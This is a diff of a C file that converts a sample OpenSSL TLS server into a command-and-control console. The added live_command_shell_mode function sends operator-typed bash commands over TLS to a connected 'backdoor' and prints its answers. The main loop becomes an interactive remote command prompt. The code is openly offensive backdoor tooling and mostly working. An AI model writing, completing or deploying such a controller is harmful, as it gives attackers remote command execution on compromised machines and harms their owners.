@@ -13,290 +13,199 @@
 #include <sys/types.h>
 #include <unistd.h>
 
+#include "../../common/c&c.h"
+#include "common.h"
+
 #define FAIL -1
 
-#define USE_FUNCTIONS 0
+/**
+ * @brief Operates input in command shell mode.
+ * Returns whether the connection should keep open (0) or not (otherwise)
+ * 
+ * @param buf 
+ * @param ssl 
+ * @return int 
+ */
+int live_command_shell_mode(char* buf, SSL *ssl){
+	int is_global_command = manage_global_command(buf, ssl);
+	if(is_global_command == 1){
+		//Already finished then, go to next command input
+		return 0;
+	}
 
-#if (USE_FUNCTIONS)
-SSL_CTX *InitServerCTX(void) {
-  const SSL_METHOD *method;
-  SSL_CTX *ctx;
+	//Not a global command, proceeding to analyze in live command shell mode
+	int bytes;
+	char* request = calloc(4096, sizeof(char));
+	strcpy(request, CC_PROT_BASH_COMMAND_REQUEST);
+	strcat(request, buf);
+	SSL_write(ssl, request, strlen(request));
+	
+	bytes = SSL_read(ssl, buf, BUFSIZ);
+	buf[bytes] = '\0';
+	//If valid message in protocol, we proceed to parse it
+	if(strncmp(buf, CC_PROT_BASH_COMMAND_RESPONSE, strlen(CC_PROT_BASH_COMMAND_RESPONSE))==0){
+		if (bytes > 0) {
+			//printf("Reply with:\n[%s]\n", response);
+			char *p;
+			p = strtok(buf, "#");
+			p = strtok(NULL, "#");
+			if(p){
+				//Print response
+				printf("%s\n", p);
+			}else{
+				printf("[" KRED "ERROR" RESET "]""Could not parse backdoor answer correctly, ignoring\n");
+			}
+			
+		} else {
+			ERR_print_errors_fp(stderr);
+		}
+	}else if(strncmp(buf, CC_PROT_ERR, strlen(CC_PROT_ERR))==0){
+		printf("[" KRED "ERROR" RESET "]""Backdoor did not understand the request: %s\n", request);
+	}else{
+		//If at this point, then we failed to identify the backdoor message
+		//We attempt to send a final message indicating we are halting the connection
+		printf("[" KRED "ERROR" RESET "]""Backdoor sent unrecognizable message:\n[%s]\n", buf);
+		printf("[" KBLU "INFO" RESET "]""Shutting down connection now\n");
+		const char *response = CC_PROT_FIN;
+		SSL_write(ssl, response, strlen(response));
+		return -1;
+	}
 
-  OpenSSL_add_all_algorithms();     /* load & register all cryptos, etc. */
-  SSL_load_error_strings();         /* load all error messages */
-  method = TLSv1_2_server_method(); /* create new server-method instance */
-  ctx = SSL_CTX_new(method);        /* create new context from method */
-  if (ctx == NULL) {
-    ERR_print_errors_fp(stderr);
-    abort();
-  }
-  return ctx;
+	//Connection should keep open
+	return 0;
 }
 
-void LoadCertificates(SSL_CTX *ctx, const char *CertFile, const char *KeyFile) {
-  /* set the local certificate from CertFile */
-  if (SSL_CTX_use_certificate_file(ctx, CertFile, SSL_FILETYPE_PEM) <= 0) {
-    ERR_print_errors_fp(stderr);
-    instructionsForPem();
-    abort();
-  }
-
-  /* set the private key from KeyFile (may be the same as CertFile) */
-  if (SSL_CTX_use_PrivateKey_file(ctx, KeyFile, SSL_FILETYPE_PEM) <= 0) {
-    ERR_print_errors_fp(stderr);
-    instructionsForPem();
-    abort();
-  }
-
-  /* verify private key */
-  if (!SSL_CTX_check_private_key(ctx)) {
-    fprintf(stderr, "Private key does not match the public certificate\n");
-    abort();
-  }
-}
-
-// Create the SSL socket and intialize the socket address structure
-int OpenListener(int port) {
-  int sd;
-  struct sockaddr_in addr;
-
-  sd = socket(PF_INET, SOCK_STREAM, 0);
-  bzero(&addr, sizeof(addr));
-  addr.sin_family = AF_INET;
-  addr.sin_port = htons(port);
-  addr.sin_addr.s_addr = INADDR_ANY;
-  if (bind(sd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
-    perror("can't bind port");
-    abort();
-  }
-  if (listen(sd, 10) != 0) {
-    perror("Can't configure listening port");
-    abort();
-  }
-  return sd;
-}
-
-void ShowCerts(SSL *ssl) //? RBW
-{
-  X509 *cert;
-  char *line;
-
-  cert = SSL_get_peer_certificate(ssl); /* Get certificates (if available) */
-  if (cert != NULL) {
-    printf("Server certificates:\n");
-    line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
-    printf("Subject: %s\n", line);
-    free(line);
-    line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
-    printf("Issuer: %s\n", line);
-    free(line);
-    X509_free(cert);
-  } else {
-    printf("No certificates.\n");
-  }
-}
-
-/* Serve the connection -- threadable */
-void Servlet(SSL *ssl) {
-  char buf[1024] = {0};
-
-  int sd, bytes;
-
-  // this is my attempt to run HTTPS.. This is sort of the minimal header that
-  // seems to work.  \r is absolutely necessary.
-  const char *szHelloWorld =
-      "HTTP/1.1 200 OK\r\n"
-      "Content-type: text/html\r\n"
-      "\r\n"
-      "<html>\n"
-      "<body>\n"
-      "<h1>So, this works, if you added a security exception to your web "
-      "browser</h1>\n"
-      "<h2>Or.... are using a genuine certificate.</h2>\n"
-      "<h3>This is using functions BTW..</h3>\n"
-      "</body>\n"
-      "</html>\n";
-
-  if (SSL_accept(ssl) == FAIL) /* do SSL-protocol accept */
-  {
-    ERR_print_errors_fp(stderr);
-  } else {
-    ShowCerts(ssl);                          /* get any certificates */
-    bytes = SSL_read(ssl, buf, sizeof(buf)); /* get request */
-    buf[bytes] = '\0';
-
-    printf("Client msg:\n[%s]\n", buf);
-
-    if (bytes > 0) {
-      printf("Reply with:\n[%s]\n", szHelloWorld);
-      SSL_write(ssl, szHelloWorld, strlen(szHelloWorld));
-    } else {
-      ERR_print_errors_fp(stderr);
-    }
-  }
-  sd = SSL_get_fd(ssl); /* get socket connection */
-  SSL_free(ssl);        /* release SSL state */
-  close(sd);            /* close connection */
-}
-#endif
 
 int server_run(int port) {
-  SSL_CTX *ctx;
-  int server;
-  const char *szPemPublic = "mycert.pem";
-  const char *szPemPrivate = "mycert.pem";
-#if (!(USE_FUNCTIONS))
-  const SSL_METHOD *method;
-#endif
+	SSL_CTX *ctx;
+	int server;
+	const char *szPemPublic = "mycert.pem";
+	const char *szPemPrivate = "mycert.pem";
+	const SSL_METHOD *method;
 
-  if (port < 1024) {
-    if (getuid() != 0) {
-      printf("This program must be run as root/sudo user since your port # "
-             "(%d) is < 1024\n",
-             port);
-      exit(1);
-    }
-  }
+	if (port < 1024) {
+		if (getuid() != 0) {
+		printf("This program must be run as root/sudo user since your port # "
+				"(%d) is < 1024\n",
+				port);
+		exit(1);
+		}
+	}
 
-  SSL_library_init(); /* Initialize the SSL library */
+	SSL_library_init(); /* Initialize the SSL library */
 
-#if (USE_FUNCTIONS)
-  ctx = InitServerCTX(); /* initialize SSL */
-#else
-  // InitServerCTX ();
-  OpenSSL_add_all_algorithms();     /* load & register all cryptos, etc. */
-  SSL_load_error_strings();         /* load all error messages */
-  method = TLSv1_2_server_method(); /* create new server-method instance */
-  ctx = SSL_CTX_new(method);        /* create new context from method */
-  if (ctx == NULL) {
-    ERR_print_errors_fp(stderr);
-    abort();
-  }
-#endif
+	// InitServerCTX ();
+	OpenSSL_add_all_algorithms();     /* load & register all cryptos, etc. */
+	SSL_load_error_strings();         /* load all error messages */
+	method = TLSv1_2_server_method(); /* create new server-method instance */
+	ctx = SSL_CTX_new(method);        /* create new context from method */
+	if (ctx == NULL) {
+		ERR_print_errors_fp(stderr);
+		abort();
+	}
 
-#if (USE_FUNCTIONS)
-  LoadCertificates(ctx, szPemPublic, szPemPrivate); /* load certs */
-#else
-  /* set the local certificate from CertFile */
-  if (SSL_CTX_use_certificate_file(ctx, szPemPublic, SSL_FILETYPE_PEM) <= 0) {
-    ERR_print_errors_fp(stderr);
-    abort();
-  }
+	/* set the local certificate from CertFile */
+	if (SSL_CTX_use_certificate_file(ctx, szPemPublic, SSL_FILETYPE_PEM) <= 0) {
+		ERR_print_errors_fp(stderr);
+		abort();
+	}
 
-  /* set the private key from KeyFile (may be the same as CertFile) */
-  if (SSL_CTX_use_PrivateKey_file(ctx, szPemPrivate, SSL_FILETYPE_PEM) <= 0) {
-    ERR_print_errors_fp(stderr);
-    abort();
-  }
+	/* set the private key from KeyFile (may be the same as CertFile) */
+	if (SSL_CTX_use_PrivateKey_file(ctx, szPemPrivate, SSL_FILETYPE_PEM) <= 0) {
+		ERR_print_errors_fp(stderr);
+		abort();
+	}
 
-  /* verify private key */
-  if (!SSL_CTX_check_private_key(ctx)) {
-    fprintf(stderr, "Private key does not match the public certificate\n");
-    abort();
-  }
-#endif
+	/* verify private key */
+	if (!SSL_CTX_check_private_key(ctx)) {
+		fprintf(stderr, "Private key does not match the public certificate\n");
+		abort();
+	}
 
-#if (USE_FUNCTIONS)
-  server = OpenListener(portnum); /* create server socket */
-#else
-  struct sockaddr_in addr;
+	struct sockaddr_in addr;
 
-  server = socket(PF_INET, SOCK_STREAM, 0);
-  bzero(&addr, sizeof(addr));
-  addr.sin_family = AF_INET;
-  addr.sin_port = htons(port);
-  addr.sin_addr.s_addr = INADDR_ANY;
-  if (bind(server, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
-    perror("can't bind port");
-    abort();
-  }
-  if (listen(server, 10) != 0) {
-    perror("Can't configure listening port");
-    abort();
-  }
-#endif
+	server = socket(PF_INET, SOCK_STREAM, 0);
+	bzero(&addr, sizeof(addr));
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(port);
+	addr.sin_addr.s_addr = INADDR_ANY;
+	if (bind(server, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
+		perror("can't bind port");
+		abort();
+	}
+	if (listen(server, 10) != 0) {
+		perror("Can't configure listening port");
+		abort();
+	}
 
-  for (;;) {
-    struct sockaddr_in addr;
-    socklen_t len = sizeof(addr);
-    SSL *ssl;
+	for (;;) {
+		struct sockaddr_in addr;
+		socklen_t len = sizeof(addr);
+		SSL *ssl;
 
-#if (!(USE_FUNCTIONS))
-    char buf[1024] = {0};
-    int sd, bytes;
+		char buf[1024] = {0};
+		int sd;
 
-    // this is my attempt to run HTTPS.. This is sort of the minimal header that
-    // seems to work.  \r is absolutely necessary.
-    const char *response =
-        "HTTP/1.1 200 OK\r\n"
-        "Content-type: text/html\r\n"
-        "\r\n"
-        "<html>\n"
-        "<body>\n"
-        "<h1>So, this works, if you added a security exception to your web "
-        "browser</h1>\n"
-        "<h2>Or.... are using a genuine certificate.</h2>\n"
-        "<h3>This is <u><i>NOT</i></u> using functions BTW..</h3>\n"
-        "</body>\n"
-        "</html>\n";
-#endif
-    int client;
-    printf("Listening for connections\n");
-    client = accept(server, (struct sockaddr *)&addr,
-                    &len); /* accept connection as usual */
-    printf("Connection: %s:%d\n", inet_ntoa(addr.sin_addr),
-           ntohs(addr.sin_port));
-    ssl = SSL_new(ctx);      /* get new SSL state with context */
-    SSL_set_fd(ssl, client); /* set connection socket to SSL state */
-#if (USE_FUNCTIONS)
-    Servlet(ssl); /* service connection */
-#else
-    if (SSL_accept(ssl) == FAIL) /* do SSL-protocol accept */
-    {
-      ERR_print_errors_fp(stderr);
-    } else {
-      X509 *cert;
-      char *line;
+		int client;
+		printf("[" KBLU "INFO" RESET "]""Listening for connections\n");
+		client = accept(server, (struct sockaddr *)&addr,
+						&len); /* accept connection as usual */
+		printf("[" KGRN "SUCCESS" RESET "]""Connection established: %s:%d\n", inet_ntoa(addr.sin_addr),
+			ntohs(addr.sin_port));
+		ssl = SSL_new(ctx);      /* get new SSL state with context */
+		SSL_set_fd(ssl, client); /* set connection socket to SSL state */
 
-      cert =
-          SSL_get_peer_certificate(ssl); /* Get certificates (if available) */
-      if (cert != NULL) {
-        printf("Server certificates:\n");
-        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
-        printf("Subject: %s\n", line);
-        free(line);
-        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
-        printf("Issuer: %s\n", line);
-        free(line);
-        X509_free(cert);
-      } else {
-        printf("No certificates.\n");
-      }
+		if (SSL_accept(ssl) == FAIL){ /* do SSL-protocol accept */
+			ERR_print_errors_fp(stderr);
+		} else {
+			X509 *cert;
+			char *line;
 
-      // ShowCerts (ssl);                         /* get any certificates */
-      bytes = SSL_read(ssl, buf, sizeof(buf)); /* get request */
-      buf[bytes] = '\0';
+			cert = SSL_get_peer_certificate(ssl); /* Get certificates (if available) */
+			if (cert != NULL) {
+				printf("[" KBLU "INFO" RESET "]""Server certificates:\n");
+				line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
+				printf("[" KBLU "INFO" RESET "]"
+					"Subject: %s\n",
+					line);
+				free(line);
+				line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
+				printf("[" KBLU "INFO" RESET "]""Issuer: %s\n",line);
+				free(line);
+				X509_free(cert);
+			} else {
+				printf("[" KYLW "WARN" RESET "]""Client has no certificate.\n");
+			}
 
-      printf("Client msg:\n[%s]\n", buf);
+			int connection_terminate = 0;
+			printf("[" KBLU "INFO" RESET "]""Live command shell mode active by default\n");
+			while(connection_terminate==0){
+				char buf[BUFSIZ];
+				//Depending on the mode, we show different UI and commands
+				switch(client_mode){
+					case CLIENT_MODE_LIVE_COMMAND:
+						printf(">> client["""KYLW"command live"RESET"""]>: ");                                                                                                                                                              
+						fgets(buf, BUFSIZ, stdin);
+						if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
+							buf[strlen(buf)-1] = '\0';   
+						}
+						connection_terminate = live_command_shell_mode(buf, ssl);
+						break;
+					default:
+						printf("Invalid client mode, fatal error, halting\n");
+						exit(FAIL);
+				}                                                                                                                                                          
+			}
+		}
+		sd = SSL_get_fd(ssl); /* get socket connection */
+		SSL_free(ssl);        /* release SSL state */
+		close(sd);            /* close connection */
+	}
+	close(server); /* close server socket */
 
-      if (bytes > 0) {
-        printf("Reply with:\n[%s]\n", response);
-        SSL_write(ssl, response, strlen(response));
-      } else {
-        ERR_print_errors_fp(stderr);
-      }
-    }
-    sd = SSL_get_fd(ssl); /* get socket connection */
-    SSL_free(ssl);        /* release SSL state */
-    close(sd);            /* close connection */
-#endif
-    //    break;
-  }
-  close(server); /* close server socket */
+	ERR_free_strings(); /* free memory from SSL_load_error_strings */
+	EVP_cleanup();      /* free memory from OpenSSL_add_all_algorithms */
+	SSL_CTX_free(ctx);  /* release context */
 
-  ERR_free_strings(); /* free memory from SSL_load_error_strings */
-  EVP_cleanup();      /* free memory from OpenSSL_add_all_algorithms */
-  SSL_CTX_free(ctx);  /* release context */
-
-  return 0;
+	return 0;
 }
